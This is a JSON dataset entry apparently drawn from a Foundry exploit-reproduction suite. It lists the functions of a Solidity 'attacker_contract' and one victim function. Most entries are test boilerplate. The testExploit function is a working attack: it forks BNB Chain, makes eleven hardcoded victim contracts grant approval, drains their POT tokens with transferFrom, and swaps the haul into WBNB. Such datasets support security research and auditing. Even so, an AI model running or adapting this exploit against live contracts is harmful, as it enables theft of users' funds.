[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 27_264_384 - 1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        address[11] memory victims = [\n            0x724DbEA8A0ec7070de448ef4AF3b95210BDC8DF6,\n            0xE5cBd18Db5C1930c0A07696eC908f20626a55E3C,\n            0xC254741776A13f0C3eFF755a740A4B2aAe14a136,\n            0x5923375f1a732FD919D320800eAeCC25910bEdA3,\n            0x68531F3d3A20027ed3A428e90Ddf8e32a9F35DC8,\n            0x807d99bfF0bad97e839df3529466BFF09c09E706,\n            0xA56622BB16F18AF5B6D6e484a1C716893D0b36DF,\n            0x8acb88F90D1f1D67c03379e54d24045D4F6dfDdB,\n            0xe8d6502E9601D1a5fAa3855de4a25b5b92690623,\n            0x435444d086649B846E9C912D21E1Bc651033A623,\n            0x52AeD741B5007B4fb66860b5B31dD4c542D65785\n        ];\n        // approve\n        for (uint256 i = 0; i < victims.length; i++) {\n            IApprove(victims[i]).approve();\n        }\n        // transfer\n        for (uint256 i = 0; i < victims.length; i++) {\n            uint256 amount = IERC20(pot).balanceOf(victims[i]);\n            if (amount == 0) {\n                continue;\n            }\n            IERC20(pot).transferFrom(victims[i], address(this), amount);\n        }\n        bscSwap(pot, usdt, IERC20(pot).balanceOf(address(this)));\n        bscSwap(usdt, wbnb, IERC20(usdt).balanceOf(address(this)));\n\n        uint256 wbnbBalance = IERC20(wbnb).balanceOf(address(this));\n        emit log_named_decimal_uint(\"[After Attacks]  Attacker WBNB balance\", wbnbBalance, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IApprove",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  }
]